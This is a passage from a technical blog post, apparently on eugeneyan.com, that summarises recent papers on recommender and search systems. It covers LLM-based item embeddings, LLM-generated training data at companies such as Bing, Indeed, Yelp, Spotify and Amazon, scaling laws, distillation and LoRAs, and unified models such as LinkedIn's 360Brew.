<p>Similarly, <strong><a href="https://dl.acm.org/doi/10.1145/3523227.3551482" target="_blank">beeFormer</a> demonstrates how to train language-only Transformers on user-item interaction data enriched with textual information.</strong> The goal is to bridge the gap between semantic similarity (from textual data) and interaction-based similarity (from user behavior).</p>

<p>beeFormer combines a sentence Transformer encoder for item embeddings with an <a href="https://dl.acm.org/doi/10.1145/3523227.3551482" target="_blank">ELSA (scalabl<strong>E</strong> <strong>L</strong>inear <strong>S</strong>hallow <strong>A</strong>utoencoder)</a>-based decoder that captures patterns from user-item interactions. First, item embeddings are generated through a Transformer trained on textual data. These embeddings are then used to compute user recommendations via ELSA’s low-rank approximation of item-to-item weight. The key here is to backpropagate the gradients from the recommendation loss through the Transformer model. As a result, weight updates capture interaction patterns rather than just semantic similarity.</p>

<p><img src="https://eugeneyan.com/assets/beeformer-fig1.jpg" loading="lazy" title="beeFormer" alt="beeFormer"></p>

<p>To make training computationally feasible on large catalogs, beeFormer applies gradient checkpointing to manage memory usage, gradient accumulation for larger effective batch sizes, and negative sampling to focus training efficiently on relevant items.</p>

<p><strong>Results:</strong> Offline evaluations show that beeFormer surpasses baseline models like mpnet-base-v2 and bge-m3. However, the comparison is limited (and IMHO unfair) since the baselines weren’t finetuned on the training dataset. Interestingly, models trained across multiple domains (movies + books) performed better than domain-specific ones, suggesting that there was transfer learning across domains.</p>

<p><strong><a href="https://arxiv.org/abs/2405.02429" target="_blank">CALRec (Google)</a> introduces a two-stage framework that finetunes a pretrained LLM (PaLM-2 XXS) for sequential recommendations.</strong> Both user interactions and model predictions are represented entirely through text.</p>

<p>First, all input (e.g., user-item interactions) is converted into text sequences by concatenating meaningful attributes (title, category, brand, price) into structured textual prompts. Attributes are formatted in the style of “Attribute name: Attribute description” and concatenated. At the end of the user history sequence, they append the item prefix, thus prompting the LLM to predict the user’s next purchase as a sentence completion task.</p>

<p><img src="https://eugeneyan.com/assets/calrec-fig2.jpg" loading="lazy" title="CALRec" alt="CALRec"></p>

<p>CALRec has a two-stage finetuning approach. The first stage involves multi-category training to adapt the model to sequential recommendation patterns in a category-agnostic way. The second stage refines the model within specific item categories. The training objective combines next-item generation tasks (predicting textual descriptions of items) with auxiliary contrastive alignment. The former aims to generate the text description of the target item given the user’s history; the latter applies contrastive loss on the output of the separate user and item towers to align user history to target item representations.</p>

<p><img src="https://eugeneyan.com/assets/calrec-fig1.jpg" loading="lazy" title="CALRec" alt="CALRec"></p>

<p>During inference, the model is prompted to generate multiple candidates via temperature sampling. They remove duplicates, sort by the output’s log probabilities in descending order, and keep the top k candidates. Then, these textual predictions are matched to catalog items via BM25 and sorted by the matching scores.</p>

<p><strong>Results:</strong> On the Amazon Review Dataset 2018, CALRec outperforms ID-based and text-based baselines (e.g., SASRec, BERT4Rec, FDSA, UniSRec). While the evaluation dataset is limited, CalRec beating the baselines is promising. Ablations demonstrate the necessity of both training stages, especially highlighting transfer learning benefits from multi-category training and incremental gains (0.8 - 1.7%) from contrastive alignment.</p>

<p><strong><a href="https://arxiv.org/abs/2405.11441" target="_blank">EmbSum (Meta)</a> presents a content-based recommendation approach using precomputed textual summaries of user interests and candidate items</strong> to capture interactions within the user engagement history.</p>

<p>EmbSum uses T5-small (61M parameters) to encode user interactions and candidate content, managing long user histories by partitioning them into sessions for encoding. Then, Mixtral-8x22B-Instruct generates the interpretable user interest summaries from user histories. These summaries are then fed into the T5’s encoder to derive final embeddings.</p>

<p><img src="https://eugeneyan.com/assets/embsum-fig1.jpg" loading="lazy" title="EmbSum" alt="EmbSum"></p>

<p>Key to this architecture are User Poly-Embeddings (UPE) and Content Poly-Embeddings (CPE). To get a global representation for UPE, they take the last token of the decoder output (<code>[EOS]</code>) and concatenate it with the representation vectors from the session encoder. This combined representation passes through a poly-attention layer which distills nuanced user interests into multiple embeddings. EmbSum training combines noisy contrastive estimation loss and summarization loss, ensuring high-quality user embeddings.</p>

<p><strong>Results:</strong> EmbSum beats several state-of-the-art content-based recommenders. <em>Nonetheless, direct comparisons with behavioral recommenders were glaringly absent.</em> Ablation studies show that CPE contributes most to performance, followed by session-based grouping and encoding, user poly-embeddings, and summarization losses. Additionally, GPT-4 evaluations indicate strong interpretability and quality of generated user interest summaries.</p>

<p>• • •</p>

<h2 id="llm-assisted-data-generation-and-analysis">LLM-assisted data generation and analysis</h2>

<p>Another common theme is using LLMs to enrich data. Several papers share about using LLMs to tackle data scarcity and enhance the quality of search and recommendations. Examples include generating webpage metadata at Bing, creating synthetic training data to identify poor job matches at Indeed, adding semantic labels for query understanding at Yelp, crafting exploratory search queries at Spotify, and enriching music playlist metadata at Amazon.</p>

<p><strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688062" target="_blank">Recommendation Quality Improvement (Bing)</a> shares how Bing improved webpage recommendations by using LLMs to generate high-quality metadata</strong> and training an LLM to predict clicks and quality.</p>

<p>Previously, Bing’s webpage representations relied on extractive summaries, which often caused query classification failures. To address this, they used GPT-4 to generate high-quality titles and snippets from full webpage content for two million pages. Then, for efficient large-scale deployment, they finetuned a Mistral-7B model using this GPT-4-generated data.</p>

<p>To improve webpage-to-webpage recommendation rankings, they finetuned a multitask MiniLM-based cross-encoder on both pairwise click predictions <em>and</em> quality classification tasks. The resulting quality scores were then linearly combined with click predictions from an existing LightGBM ranker.</p>

<p><img src="https://eugeneyan.com/assets/bing-fig2.jpg" loading="lazy" title="Recommendation Quality Improvement" alt="Recommendation Quality Improvement"></p>
<p>The MiniLM (right) is ensembled with the LightGBM ranker (left).</p>

<p>To better understand user preferences, they defined 16 distinct recommendation scenarios reflecting common user patterns. Using high-precision prompts, they classified each webpage-to-webpage recommendation, incorporating the enhanced title and snippets from Mistral-7B, into these scenarios. Then, by monitoring the distribution changes of each scenario, they quantified the improvements in webpage recommendation quality.</p>

<p><img src="https://eugeneyan.com/assets/bing-table4.jpg" loading="lazy" title="Recommendation Quality Improvement" alt="Recommendation Quality Improvement"></p>

<p><strong>Results:</strong> The enhanced system reduced clickbait by 31%, low-authority content by 35%, and duplicate content by 76%. At the same time, higher authority content increased by 18%, cross-medium recommendations rose by 48%, and recommendations with greater specificity improved by 20%. This is despite lower-quality content (e.g., clickbait) historically showing higher CTR, demonstrating the effectiveness of the quality-focused cross-encoder.</p>

<p>(👉 Recommended read) <strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688043" target="_blank">Expected Bad Match (Indeed)</a> shares how they used LLM-generated labels to filter poor job matches.</strong> Specifically, they finetuned LLMs to evaluate recommendation quality and generate labels for a post-processing classifier.</p>

<p>They started with building an evaluation set by cross-reviewing 250 matches, narrowing it down to 147 high confidence labeled examples. Then, they prompted various LLMs, such as Llama2 and Mistral-7B, using expert recruitment guidelines to evaluate match quality across dimensions like job descriptions, resumes, and user interactions. However, these models struggled with detailed prompts, producing generalized assessments that didn’t consider detailed job and job seeker information. On the other hand, GPT-4 performed better but was prohibitively expensive.</p>

<p>To balance cost and effectiveness, the team finetuned GPT-3.5 on a curated dataset of over 200 human-reviewed GPT-4 responses. This finetuned GPT-3.5 matched GPT-4’s performance at just a quarter of the cost and latency. But despite the improvements, its inference latency of 6.7 seconds remained too high for online use. Thus, they trained a lightweight classifier, eBadMatch, using LLM-generated labels and categorical features from job descriptions, resumes, and user activity. In production, a daily pipeline samples job matches, engineers features, anonymizes data, generates LLM labels, and retrains the model. This classifier acts as a post-processing filter to remove low-quality matches.</p>

<p><strong>Results:</strong> The eBadMatch classifier achieved an AUC-ROC of 0.86 against LLM labels, with latency suitable for real-time filtering. Online experiments demonstrated that applying a 20% threshold filter on invitation-to-apply emails reduced batch matches by 17.68%, lowered unsubscribe rates by 4.97%, and increased application rates by 4.13%. Similar improvements were observed in homepage recommendation feeds.</p>

<p><img src="https://eugeneyan.com/assets/ebadmatch-table2.jpg" loading="lazy" title="Expected Bad Match" alt="Expected Bad Match"></p>

<p>(👉 Recommended read) <strong><a href="https://engineeringblog.yelp.com/2025/02/search-query-understanding-with-LLMs.html" target="_blank">Query Understanding (Yelp)</a> shows how they integrated LLMs into their query understanding pipeline</strong> to improve query segmentation and review highlights.</p>

<p>Query segmentation identifies meaningful parts of user queries—such as topic, name, time, location, and question—and tags them accordingly. Along the way, they learned that spelling correction and segmentation could be done together and thus added a meta tag to mark spell-corrected sections and combined both tasks into a single prompt. Retrieval-augmented generation (RAG) further improved segmentation accuracy by incorporating business names and categories as context that disambiguated user intent. For evaluation, they compared LLM-identified segments against human-labeled datasets of name match and location intent.</p>

<p>Review highlights selects key snippets from reviews to highlight in search results. They used LLMs to generate synonymous phrases suitable for highlights. Curated examples prompted LLMs to replicate human reasoning in phrase expansion. RAG further enhanced relevance by augmenting the input with relevant business categories to guide phrase generation. Offline evaluation was done via human annotators before online A/B testing of the new highlight phrases. To scale efficiently and cover 95% of traffic, Yelp pre-computed snippet expansions using batch calls to OpenAI and stored them in key-value stores to reduce latency.</p>

<p><img src="https://eugeneyan.com/assets/yelp-fig3.jpg" loading="lazy" title="Review highlights" alt="Review highlights"></p>

<p>The team shared their approach—from initial formulation and proof of concept (POC) to scaling up. Initially, they assessed LLM suitability and defined the project’s scope. During POC, they leveraged the power-law distribution of queries, caching pre-computed LLM responses for common queries covering most traffic. To scale, they created golden datasets using GPT-4 outputs and finetuned smaller, cost-effective models like GPT-4o-mini. Additionally, real-time models like BERT and T5 addressed less frequent, long-tail queries.</p>

<p><strong>Results:</strong> Yelp’s query segmentation significantly improved location intent detection, while enhanced review highlights increased both session and search click-through rates (CTR), especially benefiting long-tail queries.</p>

<p><strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688035" target="_blank">Query Recommendations (Spotify)</a> details how they built a hybrid query recommendation system to suggest exploratory search queries</strong> alongside direct results. This approach was necessary to support Spotify’s expansion beyond music to podcasts, audiobooks, and diverse content types by helping users explore those content.</p>

<p><img src="https://eugeneyan.com/assets/query-recs-fig1.jpg" loading="lazy" title="Query Recommendations" alt="Query Recommendations"></p>

<p>Spotify generated query suggestions by (i) extracting from catalog titles, playlist names, and podcasts, (ii) mining suggestions from search logs, (iii) leveraging users’ recent searches, (iv) applying metadata and expansion rules (e.g., “artist name” + “covers”), and (v) generating synthetic natural language queries via LLMs. To generate synthetic queries, techniques such as Doc2query and InPars were used to broaden query variations, enhancing exploratory searches and mitigating retrievability bias.</p>

<p>The query suggestions were then combined with regular results and ranked by a point-wise ranker optimized for downstream user actions like streaming or adding content to playlists. The ranker use features such as lexical matching, query statistics, retrieval scores, and user consumption patterns. For personalization, they relied on vector representations of users and query suggestion candidates.</p>

<p><strong>Results:</strong> Spotify saw a 9% increase in exploratory intent queries, a 30% rise in maximum query length per user, and a 10% increase in average query length—this suggests the query recommendation updates helped users express more complex intents. An online ablation showed the ranker’s removal caused a 20% decline in clicks on recommendations, underscoring its importance.</p>

<p><strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688047" target="_blank">Playlist Search (Amazon)</a> discusses Amazon’s integration of LLMs into playlist search pipelines to tackle challenges</strong> like data scarcity, metadata enrichment, and scalable evaluation while reducing reliance on manual annotation.</p>

<p>To enrich metadata, they used LLMs (LLM curator) to create detailed descriptions for community playlists based on their initial 15 tracks, capturing themes, genres, activities, and artists. (These community playlists typically only had a playlist title.) This addressed data scarcity in community-generated content. Then, Flan-T5-XL was finetuned to scale this inference process.</p>

<p>They also applied LLMs to generate synthetic queries paired with playlists (and associated metadata) to create training data for bi-encoder models. These pairs were generated and scored by an LLM (LLM labeler) to maintain balanced positive and negative examples. Lastly, they used an LLM (LLM judge), guided by human annotations and careful prompting to ensure alignment, to streamline evaluations.</p>

<p><img src="https://eugeneyan.com/assets/playlist-fig1.jpg" loading="lazy" title="Playlist Search" alt="Playlist Search"></p>

<p><strong>Results:</strong> Integrating LLMs led to substantial double-digit recall improvements across benchmarks, SEO, and paraphrasing datasets. Overall, the use of LLMs helped overcome the challenges of data scarcity and evaluation scalability without extensive manual effort.</p>

<p>• • •</p>

<h2 id="scaling-laws-transfer-learning-distillation-loras">Scaling Laws, transfer learning, distillation, LoRAs</h2>

<p>Another trend is the adoption of training approaches from large language models (LLMs) and computer vision into recommender systems. This includes exploring scaling laws (how model size and data quantity affect performance), using knowledge distillation to transfer insights from large models to smaller, efficient ones, applying cross-domain transfer learning to handle limited data, and parameter-efficient fine-tuning techniques such as LoRAs.</p>

<p>(👉 Recommended read)&nbsp;<strong><a href="https://arxiv.org/abs/2311.11351" target="_blank">Scaling Laws</a> investigates how the performance of ID-based sequential recommender models improve as their model size and data scale increase.</strong> The authors uncovered a predictable power-law relationship where performance consistently improves as the size of both models and datasets expands.</p>

<p>They adopt a decoder-only transformer architecture, experimenting with models ranging from 98.3K to 0.8B parameters. They evaluated these models on the MovieLens-20M and Amazon-2018 datasets. For the Amazon dataset, interaction records from 29 domains were combined, sorted chronologically, and simplified to include only item IDs without additional metadata. The datasets were then formatted into fixed-length sequences of 50 items each; shorter sequences were padded and longer ones were truncated. The model is then optimized to predict the next item at time step $t + 1$ conditioned on the previous $t$ items.</p>

<p><img src="https://eugeneyan.com/assets/scaling-fig1.jpg" loading="lazy" title="Scaling Laws" alt="Scaling Laws"></p>

<p>To tackle instability in training larger models, the authors introduced two key improvements. First, they implemented layer-wise adaptive dropout, applying higher dropout rates in lower layers and lower dropout rates in upper layers. The intuition is that lower layers process direct input from data and are more prone to overfitting. Conversely, higher layers build more abstract representations and thus benefit from less dropout to reduce information loss that could lead to underfitting.</p>

<p>The second improvement was dynamically switching optimizers during training—starting with Adam before switching to stochastic gradient descent (SGD) at a predefined point. This approach is motivated by the observation that Adam quickly reduces loss in early training phases but ultimately SGD achieves better convergence.</p>

<p><strong>Results:</strong> Unsurprisingly, increased model capacity (excluding embedding parameters) consistently reduced cross-entropy loss. They modeled this with a power-law curve and accurately predicted performance for larger models (75.5M and 0.8B params). Similarly, they observed that larger models could achieve lower losses even with smaller datasets, whereas smaller models needed more data to reach comparable performance. For example, a smaller 98.3K-parameter model required twice the data (18.5M interactions) compared to a larger 75.5M-parameter model (9.2M interactions) to attain similar performance.</p>

<p><img src="https://eugeneyan.com/assets/scaling-fig2.jpg" loading="lazy" title="Scaling Laws" alt="Scaling Laws"></p>

<p>Regarding data repetition, models of sizes 75.5M and 98.3K parameters continued improving beyond a single training epoch, with notable gains observed from two to five epochs. Surprisingly, changing model shape had minimal impact on performance. Ablation studies showed that layer-wise adaptive dropout and optimizer switching substantially enhanced performance in larger models (24 layers), though smaller models (2 layers) remained largely unaffected. Further ablations on five challenging recommendation tasks highlighted the advantage of larger models, particularly for long-tail items and cold-start users.</p>

<p><strong><a href="https://arxiv.org/abs/2401.01497" target="_blank">PrepRec</a> shows how pretraining can be adapted to recommender systems, enabling cross-domain, zero-shot recommendations.</strong> The key innovation is leveraging item popularity dynamics derived solely from user interactions, without relying on item metadata.</p>

<p>PrepRec uses popularity statistics calculated over coarse (monthly) and fine (weekly) timescales. These popularity metrics are converted into percentiles and then encoded into vector representations. In addition, the model incorporates relative time intervals between user interactions and uses a fixed positional encoding for each interaction in a user’s sequence. (IMHO, while the approach is effective, it relies on several specialized techniques—coarse vs. fine-grained periods, relative time intervals, and positional encodings—which might limit its generalizability.)</p>

<p><img src="https://eugeneyan.com/assets/preprec-fig2.jpg" loading="lazy" title="PrepRec" alt="PrepRec"></p>

<p>For training, PrepRec has binary cross-entropy as the objective and uses Adam for optimization. The model and baselines have consistent settings: embedding dimension of 50, max sequence length of 200, and batch size of 128. During inference, PrepRec calculates item popularity dynamics from the target domain before generating recommendations via inference on the pretrained model.</p>

<p><strong>Results:</strong> PrepRec achieves promising zero-shot performance, with only a minor reduction (2-6% recall@10) compared to models like SasREC and BERT4Rec which were specifically trained on the target domains. When trained from scratch on the target domains, PrepRec matches or slightly surpasses these models in regular sequential recommendations despite using just 1-5% of their parameters, thanks to not having item-specific embeddings. Ablations showed that modeling relative time intervals significantly boosted performance, and capturing both coarse and fine-grained popularity trends was essential for tracking evolving user interests.</p>

<p><strong><a href="https://arxiv.org/abs/2408.16238" target="_blank">E-CDCTR (Meituan)</a> demonstrates the potential of transfer learning by using organic item data to improve click-through rate (CTR) predictions in advertising</strong>, tackling the challenge of sparse ad data.</p>

<p>E-CDCTR has three components: the tiny pretraining model (TPM), complete pretraining model (CPM), and advertising CTR model (A-CTR). The TPM, a lightweight model with just embedding and MLP layers, trains monthly on six months of organic impressions and clicks. It captures long-term collaborative filtering signals via historical user and item embeddings. Features include user and item IDs, category IDs, etc.</p>

<p><img src="https://eugeneyan.com/assets/e-cdctr-fig2.jpg" loading="lazy" title="E-CDCTR" alt="E-CDCTR"></p>

<p>Next, the CPM pretrains a CTR model weekly using the most recent month’s organic data and using the user and item embeddings learned by TPM. Finally, the A-CTR model is initialized from the CPM and finetuned daily on advertising-specific data. A-CTR also uses user and item embeddings from the TPM. A-CTR also uses richer features such as user behavior sequences, user context, item metadata, and feature interactions, resulting in a more sophisticated model architecture that includes sequential input, feature crosses, and a larger MLP layer.</p>

<p>For online inference, E-CDCTR employs user and item embeddings generated by TPM from the past three months. The A-CTR model then uses these embeddings to predict the advertising CTR. (The authors mention using self-attention to combine embeddings but provide limited details on training it.)</p>

<p><strong>Results:</strong> E-CDCTR outperforms cross-domain baselines such as KEEP, CoNet, DARec, and MMoE. Ablation studies confirm the value of both TPM and CPM, with CPM having a more substantial impact. In addition, extending historical embeddings from one to three months further enhanced performance, whereas simply merging advertising data with organic data did not yield improvements.</p>

<p><strong><a href="https://arxiv.org/abs/2408.14678" target="_blank">Bridging the Gap (YouTube)</a> shares insights on applying knowledge distillation in large-scale personalized video recommendations at YouTube.</strong></p>

<p>Their recommenders are multi-objective pointwise models for ranking videos. These models simultaneously optimizing short-term objectives like video CTR and long-term objectives like the estimated long-value value of a user. Their models typically feature a teacher-student setup, with the teacher and student models sharing similar architectures though the teacher model is 2 - 4x larger than the student model.</p>

<p>However, distribution shifts between teacher and student can cause biases. To address this, the authors propose an auxiliary distillation strategy—instead of directly using the teacher’s predictions (soft labels), they decouple the hard labels from the soft teacher predictions via separate task logits. This enables the student model to effectively learn from the teacher without inheriting unwanted biases.</p>

<p><img src="https://eugeneyan.com/assets/bridge-fig2.jpg" loading="lazy" title="Bridging the gap" alt="Bridging the gap"></p>

<p>To amortize the cost of training the large teacher model, they have a single teacher improve multiple student models. As a result, a single teacher model can provide distilled knowledge to various specialized recommendation tasks, reducing redundancy and computational overhead. Teacher labels are stored in a columnar database that prioritizes read performance for the students during training.</p>

<p><img src="https://eugeneyan.com/assets/bridge-fig3.jpg" loading="lazy" title="Bridging the gap" alt="Bridging the gap"></p>

<p><strong>Results:</strong> The auxiliary distillation strategy delivered a 0.4% improvement in E(LTV) prediction compared to direct distillation methods, which performed similarly to models without distillation. This confirms the auxiliary distillation approach’s effectiveness in reducing teacher noise. In ablation studies on teacher size, even a modest teacher (2x the student’s size) led to meaningful improvements (+0.42% engagement, +0.34% satisfaction) while a 4x teacher led to +0.43% engagement and +0.46% satisfaction.</p>

<p>Similarly, <strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688041" target="_blank">Self-Auxiliary Distillation (Google)</a> introduces a distillation framework aimed at improving sample efficiency for large-scale recommendation models.</strong></p>

<p>The core idea is to prioritize training on high-quality labels while improving the resolution of lower-quality labels. The intuition is that positive labels provide more signal than negative labels when predicting CTR, thus it makes sense to prioritize them. On the other hand, negative labels are closer to weak positives than an absolute zero—thus, representing them with an estimated CTR value offers better training signal.</p>

<p>The model has a shared bottom tower with two heads: the main head (teacher) is trained directly on ground-truth labels, serving as the primary inference model and generating calibrated soft labels. Calibration is maintained by ensuring the mean prediction matches the mean of actual labels. The auxiliary head (student) learns from a mixture of these soft teacher labels and original labels, helping stabilize the training process. Specifically, the auxiliary head has a bilateral branch where one branch distills knowledge from the teacher’s soft labels and the other learns from the hard ground-truth label. A selector merges the labels from both branches using functions such as $max(y, y’)$.</p>

<p><img src="https://eugeneyan.com/assets/selfaux-fig1.jpg" loading="lazy" title="Self-auxiliary distillation" alt="Self-auxiliary distillation"></p>

<p><strong>Results:</strong> Self-attention distillation consistently improved recommendation quality across multiple domains including apps, commerce, and video recommendations. Ablations show that training on original ground-truth labels primarily drives performance gains, while the distillation component significantly stabilizes and aligns the model’s predictions. Training exclusively on ground-truth labels showed inconsistent results while training on the distillation labels only didn’t lead to improvements.</p>

<p><strong><a href="https://arxiv.org/abs/2405.00338" target="_blank">DLLM2Rec</a> shows how to distill recommendation knowledge from LLMs into lightweight, conventional sequential recommendation models</strong>, making deployment more practical. The paper identifies three main challenges: (i) unreliable teacher knowledge/labels, (ii) the capability gap between teacher and student models, and (iii) semantic divergence between the teacher’s and student’s embedding spaces.</p>

<p>To tackle these issues, DLLM2Rec adopts two key strategies: importance-aware ranking distillation and collaborative embedding distillation. Importance-aware ranking distillation focuses on selecting reliable instances for training via importance weights. These weights consider factors like ranking position (prioritizing items ranked higher by the teacher), teacher confidence (evaluated through content similarity between generated descriptions and actual items), and the consistency between the teacher’s and student’s recommendations. Meanwhile, collaborative embedding distillation involves using a learnable MLP to effectively translate embeddings from the teacher’s semantic space into the student’s space.</p>

<p><img src="https://eugeneyan.com/assets/dllm2rec-fig1.jpg" loading="lazy" title="DLLM2Rec" alt="DLLM2Rec"></p>

<p>In their experiments, they use BIGRec (built on Llama2-7B) as the teacher and three popular sequential models (GRU4Rec, SASRec, and DROS) as students.</p>

<p><strong>Results:</strong> DLLM2Rec boosts the performance of student models, showing an average improvement of 47.97% across three datasets (Amazon Video Games, MovieLens-10M, and Amazon Toys and Games) when evaluating hit rate@k and NDCG@k (see Table 5 in the paper). Additionally, inference time dropped significantly, from 3-6 hours with the teacher model down to just 1.6-1.8 seconds with DLLM2Rec.</p>

<p><strong><a href="https://arxiv.org/abs/2408.08913" target="_blank">MLoRA (Alibaba)</a> describes using domain-specific LoRAs (low-rank adapters) to enhance multi-domain CTR prediction models.</strong> It addresses two common problems: data sparsity (limited data per domain) and domain diversity (variations across domains) that typically arise when training either separate models or a single combined model respectively.</p>

<p>They adopt a two-step training process. First, they pretrained a shared backbone network on extensive, multi-domain data to learn generalizable patterns across domains. Then, they freeze the backbone and finetune domain-specific LoRAs on each domain’s unique data. A key challenge was adapting LoRA ranks layer-by-layer due to varying dimensions in CTR model layers. (Recommender models have different dimentions per layer unlike language models which typically have uniform dimensions.) In their experiments, all models had hidden layers of 256, 128, and 64 dimensions.</p>

<p><img src="https://eugeneyan.com/assets/mlora-fig3.jpg" loading="lazy" title="MLoRA" alt="MLoRA"></p>

<p>To get a sense of data distribution differences between pretraining and finetuning: During their A/B test, the pretrained backbone used 13 billion samples spanning 90 days from 10 domains, whereas finetuning involved 3.2 billion samples from just 21 days.</p>

<p><strong>Results:</strong> MLoRA increased AUC by 0.5% across datasets such as Taobao-10, Amazon-6, and MovieLens. Ablation studies showed that domains with smaller datasets and higher inter-domain differences benefited more. They also found that simpler models (like MLP) performed best with lower LoRA ranks (32), while more complex models (like DeepFM) benefited from higher ranks (64 - 128). A/B testing showed substantial business gains—a 1.49% lift in CTR, a 3.37% boost in conversions, and a 2.71% increase in paid buyers—with only a modest 1.76% rise in model complexity due to the use of LoRAs.</p>

<p><strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688053" target="_blank">Taming One-Epoch (Pinterest)</a> highlights the challenge of models overfitting after just one training epoch</strong>, primarily due to the long-tail nature of recommendation data. (Perhaps the Scaling Laws paper above, which showed gains beyond one epoch, used datasets (i.e., Amazon and MovieLens) that had the long-tail filtered out.) This overfitting arises because tail entries have far more degrees of freedom compared to the limited training examples available.</p>

<p>Here’s more context on the “one-epoch problem”: In online experiments, they saw that deep CTR models without ID embeddings typically require multiple epochs to converge. However, introducing ID embeddings often causes performance to peak after just one epoch, leading to worse results compared to multi-epoch training without ID embeddings.</p>

<p>Their solution involves two distinct stages. In the first stage, they pretrain foundational ID embeddings using a minimal dot-product model combined with contrastive loss, utilizing in-batch and uniformly random negatives. This contrastive approach reduces the effective dimensionality of tail entries, minimizing overfitting. Moreover, because the pretraining step is relatively lightweight, they can use a much larger dataset—around ten times the engagement data compared to the downstream recommendation model.</p>

<p>In the second stage, the pretrained embeddings are finetuned in task-specific models for multiple epochs. By separating embedding pretraining from downstream finetuning, they mitigate overfitting and get better results compared to merely freezing the embeddings.</p>

<p><img src="https://eugeneyan.com/assets/one-epoch-fig1.jpg" loading="lazy" title="Taming One-Epoch" alt="Taming One-Epoch"></p>

<p><strong>Results:</strong> In Figure 2 above, the typical binary cross-entropy (BCE) loss tends to overfit after the first epoch, whereas the contrastive loss remains stable. Ablation studies revealed that a single-stage training method underperformed relative to baseline models due to severe overfitting (−3.347% for Homefeed and −1.907% for Related Pins). Conversely, the two-stage training consistently yielded superior results (+1.323% Homefeed, +2.187% Related Pins), and in online A/B tests, led to a significant overall engagement lift of 2.2%.</p>

<p><strong><a href="https://arxiv.org/abs/2409.14517" target="_blank">Sliding Window Training (Netflix)</a> describes their method for efficiently training on long user history sequences</strong> without incurring the memory and latency costs associated with large input sizes. One workaround is to truncate user historical interactions—however, this comes at the cost of not using valuable information from the entire user journey.</p>

<p>Their solution is elegantly simple. Assuming a baseline model that only handles sequences of up to 100 items, they introduce a sliding window sampler during training. This sampler selects different segments of user history in each training epoch, allowing the model to learn on long-term user patterns. Additionally, they experimented with mixing epochs—some focused exclusively on sliding windows, while others emphasized only the latest 100 interactions—to balance between recent user behavior and historical preferences.</p>

<p><img src="https://eugeneyan.com/assets/sliding-window-fig2.jpg" loading="lazy" title="Sliding Window Training" alt="Sliding Window Training"></p>

<p><strong>Results:</strong> Offline evaluations showed the sliding window method consistently outperformed models trained solely on the most recent 100 interactions. Specifically, a pure sliding window variant slightly reduced Mean Reciprocal Rank (MRR) by 1.2%, but improved Mean Average Precision (MAP) by 1.5% and recall significantly by 7.01%. Hybrid approaches combining sliding windows with recent interactions, and extending input sequence lengths to 500 or even 1000 items, delivered the best overall performance. However, these extended approaches had slightly worse perplexity, indicating a trade-off between predictive confidence and actual recommendation performance.</p>

<p>• • •</p>

<h2 id="unified-architectures-for-search-and-recommendations">Unified architectures for search and recommendations</h2>

<p>The final theme highlights a growing shift toward unified system architectures that blend search and recommendations, drawing inspiration from foundation models. Instead of deploying multiple single-task models, recent papers present unified frameworks capable of handling diverse retrieval and ranking tasks within a shared infrastructure. For example, LinkedIn’s 360Brew and Netflix’s UniCoRn show how unified models trained on multiple tasks can outperform specialized, single-task counterparts.</p>

<p><strong><a href="https://arxiv.org/abs/2410.16823" target="_blank">Bridging Search &amp; Recommendations (Spotify)</a> demonstrates the advantages of training a unified generative retrieval model</strong> on both search and recommendation data, rather than separately, and how it can outperform task-specific models.</p>

<p>In their approach, a generative recommender predicts item IDs based on a user’s past interactions, while a generative search retriever predicts item IDs from tokenized search queries. The underlying model builds upon Flan-T5-base, extending the vocabulary to include all item IDs with one additional token per item. These models are trained auto-regressively using teacher forcing and cross-entropy loss, aiming to accurately predict the next relevant item ID. During inference, item IDs are generated directly from either a user’s interaction history (for recommendations) or a text query (for search).</p>

<p><img src="https://eugeneyan.com/assets/bridging-spotify-table1.jpg" loading="lazy" title="Bridging search and recsys" alt="Bridging search aand recsys"></p>

<p>Evaluation is done via standard recall metrics (recall@10 for simulated datasets, recall@30 for real-world datasets) against common baselines like BM25, SASRec, and BERT4Rec.</p>

<p><strong>Results:</strong> Jointly trained multi-task models outperformed their single-task counterparts, achieving an average increase of 16% in recall@30. On the Podcasts dataset, the unified model significantly improved performance by +33% across both tasks, especially for torso items (those outside the top 1%), showing gains of 262% for recommendations and 855% for search.</p>

<p>While the research wasn’t focused on replacing conventional models, the comparisons against behavioral baselines were insightful. Across three datasets, generative models consistently lagged behind specialized recommendation baselines (SASRec, BERT4Rec) significantly (green below). Similarly, for search, traditional baselines (BM25, Bi-encoder) were still superior (green below). This indicates that generative retrieval models are still far from fully replacing conventional methods.</p>

<p><img src="https://eugeneyan.com/assets/bridging-spotify-table5.jpg" loading="lazy" title="Bridging search and recsys" alt="Bridging search aand recsys"></p>

<p>(👉 Recommended read)  <strong><a href="https://arxiv.org/abs/2501.16450" target="_blank">360Brew (LinkedIn)</a> consolidates several ID-based ranking models into a single large 150B decoder-only model</strong> equipped with a natural language interface, effectively replacing traditional feature engineering with prompt engineering.</p>

<p><img src="https://eugeneyan.com/assets/360brew-table1.jpg" loading="lazy" title="360Brew" alt="360Brew"></p>

<p>360Brew builds upon the Mixtral-8x22B pretrained Mixture-of-Experts model. Its fine-tuning dataset includes 3-6 months of interactions from roughly 45 million monthly active users in the US, encompassing member profiles, job descriptions, posts, and various interaction logs—all transformed into a text-based format.</p>

<p>Training involves three key stages. First, continuous pretraining (CPT) is done with a maximum context length of 16K tokens with packing techniques. Next, instruction fine-tuning (IFT) is performed using a mix of open-source datasets (such as UltraChat) and internally generated instruction-following data. Finally, supervised fine-tuning (SFT) applies multi-turn chat templates designed to enhance the model’s understanding of member-entity interactions, improving its predictive capabilities across specific user interfaces.</p>

<p>The model was trained on 256-512 H100 GPUs using FSDP, and production deployment adopts vLLM and inference-time RoPE scaling. 360Brew focuses on binary prediction tasks, such as whether a user will like a posts, and uses token logits to assign scores.</p>

<p><strong>Results:</strong> The unified model supports over 30 different ranking tasks across LinkedIn’s platforms, matching or surpassing specialized production models while reducing complexity and maintenance overhead. The researchers also found that the unified model improved substantially with more data—while initial iterations performed poorly, tripling the dataset resulted in performance exceeding specialized models (Figure 2 below). Additionally, larger models consistently outperformed smaller versions (8x22B &gt; 8x7B &gt; 7B). Also, 360Brew delivered strong performance for cold-start users, outperforming traditional models by a wider margin when user interaction data was limited.</p>

<p><img src="https://eugeneyan.com/assets/360brew-fig2.jpg" loading="lazy" title="360Brew" alt="360Brew"></p>

